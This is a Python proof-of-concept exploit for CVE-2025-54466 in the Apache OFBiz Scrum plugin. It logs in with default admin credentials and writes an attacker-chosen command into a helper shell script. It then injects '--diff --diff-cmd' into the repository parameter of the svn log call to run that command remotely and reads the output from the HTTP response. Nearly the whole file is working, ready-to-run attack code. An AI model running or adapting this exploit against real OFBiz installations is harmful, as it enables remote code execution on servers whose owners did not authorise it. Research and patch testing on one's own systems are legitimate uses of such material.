#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache OFBiz Scrum Plugin — RCE via SVN Argument Injection (svn log --diff --diff-cmd)
# CVE            : CVE-2025-54466
# Vendor         : Apache Software Foundation
# Product        : Apache OFBiz (Scrum Plugin)
# Affected       : All versions before 24.09.02
# Fixed          : 24.09.02
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-54466 Vector 2 — RCE via 'svn log --diff --diff-cmd' injection.

Exploits the SAME viewScrumRevision() method but targets the 'svn log'
command (line 143-144) instead of 'svn diff'. Injects '--diff --diff-cmd'
to achieve RCE via the log command's inline diff feature.

Output appears in the 'logMessage' field, not 'diffMessage', proving
BOTH svn commands in viewScrumRevision() are independently exploitable.

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-54466
    - https://github.com/advisories/GHSA-7vg9-49f9-pfxr

Usage:
    python3 poc_vector2.py localhost 8443 --command "id"
"""

import sys
import ssl
import html
import re
import os
import stat
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar
import argparse
import textwrap

DEFAULT_PORT = 8443
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "ofbiz"
DEFAULT_COMMAND = "id"
SVN_WC_PATH = "/home/ofbiz/svnwc"

# Paths for the helper script (bind-mounted: host ./poc ↔ container /opt/poc)
POC_DIR = os.path.dirname(os.path.abspath(__file__))
HELPER_SCRIPT_LOCAL = os.path.join(POC_DIR, ".helper_v2.sh")
HELPER_SCRIPT_CONTAINER = "/opt/poc/.helper_v2.sh"


def create_https_context():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def build_opener():
    cookie_jar = http.cookiejar.CookieJar()
    cookie_handler = urllib.request.HTTPCookieProcessor(cookie_jar)
    https_handler = urllib.request.HTTPSHandler(context=create_https_context())
    opener = urllib.request.build_opener(cookie_handler, https_handler)
    return opener, cookie_jar


def authenticate(opener, base_url, username, password):
    """Authenticate to OFBiz and obtain session cookie."""
    login_url = f"{base_url}/scrum/control/login"
    data = urllib.parse.urlencode({
        "USERNAME": username,
        "PASSWORD": password,
    }).encode("utf-8")

    print(f"[*] Authenticating as '{username}'...")
    try:
        resp = opener.open(login_url, data, timeout=30)
        resp.read()
        print(f"[+] Authentication successful")
        return True
    except urllib.error.URLError as e:
        print(f"[-] Connection failed: {e}")
        return False


def stage_helper_script(command):
    """Stage a helper shell script via bind mount (host ./poc → container /opt/poc)."""
    script_content = f"#!/bin/sh\n{command}\n"

    with open(HELPER_SCRIPT_LOCAL, "w") as f:
        f.write(script_content)
    os.chmod(HELPER_SCRIPT_LOCAL, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    print(f"[+] Helper script staged (bind-mounted at {HELPER_SCRIPT_CONTAINER})")
    return True


def cleanup():
    """Remove helper script after exploit."""
    try:
        os.remove(HELPER_SCRIPT_LOCAL)
    except FileNotFoundError:
        pass


def exploit(target_host, target_port, command=DEFAULT_COMMAND,
            username=DEFAULT_USERNAME, password=DEFAULT_PASSWORD):
    """
    Exploit via svn log --diff --diff-cmd injection.

    The vulnerable code:
        String logCommand = "svn log -r" + revision + " " + repository;
        Process logProcess = Runtime.getRuntime().exec(logCommand);

    We set repository to: --diff --diff-cmd={helper} {svn_wc_path}

    After tokenization:
        ["svn", "log", "-r2", "--diff", "--diff-cmd={helper}", "{svn_wc_path}"]

    'svn log --diff' shows inline diffs; --diff-cmd specifies the diff program.
    Output appears in the 'logMessage' response field.
    """
    base_url = f"https://{target_host}:{target_port}"

    print("=" * 70)
    print("CVE-2025-54466 Vector 2: RCE via 'svn log --diff --diff-cmd'")
    print("=" * 70)
    print(f"[*] Target: {base_url}")
    print(f"[*] Command: {command}")
    print(f"[*] Vector: svn log (logMessage output)")
    print()

    # Build HTTP client
    opener, _ = build_opener()

    # Authenticate
    if not authenticate(opener, base_url, username, password):
        return False
    print()

    # Stage helper script
    if not stage_helper_script(command):
        return False
    print()

    # Build malicious payload
    # Key difference: we inject '--diff --diff-cmd=<script>' BEFORE the svn_wc_path
    # This tells 'svn log' to show inline diffs using our script
    payload = f"--diff --diff-cmd={HELPER_SCRIPT_CONTAINER} {SVN_WC_PATH}"

    params = urllib.parse.urlencode({
        "revision": "2",
        "repository": payload,
    })

    exploit_url = f"{base_url}/scrum/control/RevisionInfo?{params}"

    print(f"[*] Sending exploit request...")
    print(f"[*] Payload: repository={payload}")
    print(f"[*] Resulting svn command: svn log -r2 {payload}")

    try:
        resp = opener.open(exploit_url, timeout=30)
        body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as e:
        print(f"[-] Request failed: {e}")
        cleanup()
        return False

    # Extract command output from logMessage (PRE TAG 1)
    pre_pattern = re.compile(r'<pre[^>]*>(.*?)</pre>', re.DOTALL)
    matches = pre_pattern.findall(body)

    log_output = html.unescape(matches[0]).strip() if len(matches) >= 1 else ""
    diff_output = html.unescape(matches[1]).strip() if len(matches) >= 2 else ""

    # For this vector, output should appear in the log output (PRE TAG 1)
    # because we're injecting into the 'svn log' command
    rce_output = log_output

    # Clean up SVN header lines from the output
    if rce_output:
        lines = rce_output.split('\n')
        clean = [l for l in lines if not l.startswith('---') or 'r2' not in l]
        rce_output = '\n'.join(clean).strip()

    print()
    print("=" * 70)
    if rce_output:
        print("[+] VECTOR 2 SUCCESSFUL — Command output in logMessage:")
        print("=" * 70)
        print()
        print(rce_output)
        print()
        print("=" * 70)
        print("[+] Demonstrated: RCE via 'svn log --diff --diff-cmd' injection")
        print("[+] Output location: logMessage (PRE TAG 1), not diffMessage")
        cleanup()
        return True
    else:
        # The log command might not show diffs on all SVN versions
        # Check if the diff output (from the second svn diff call) has our output
        if diff_output:
            # Strip SVN header
            lines = diff_output.split('\n')
            clean = [l for l in lines if not l.startswith('Index:') and not l.startswith('=' * 10)]
            clean_text = '\n'.join(clean).strip()
            if clean_text:
                print("[+] VECTOR 2 PARTIALLY SUCCESSFUL — output in diffMessage instead:")
                print("=" * 70)
                print(clean_text)
                print()
                print("[*] Note: svn log --diff may not produce inline output on this SVN version.")
                print("[*] The diff command (separate call) still executed our payload.")
                cleanup()
                return True

        print("[-] VECTOR 2: No command output detected in response")
        print("=" * 70)
        if log_output:
            print(f"[*] Raw logMessage: {log_output[:300]}")
        if diff_output:
            print(f"[*] Raw diffMessage: {diff_output[:300]}")
        cleanup()
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-54466 Vector 2: RCE via svn log --diff --diff-cmd"
    )
    parser.add_argument("host", nargs="?", default="localhost")
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    parser.add_argument("-c", "--command", default=DEFAULT_COMMAND)
    parser.add_argument("-u", "--username", default=DEFAULT_USERNAME)
    parser.add_argument("-p", "--password", default=DEFAULT_PASSWORD)

    args = parser.parse_args()
    success = exploit(args.host, args.port, args.command, args.username, args.password)
    sys.exit(0 if success else 1)
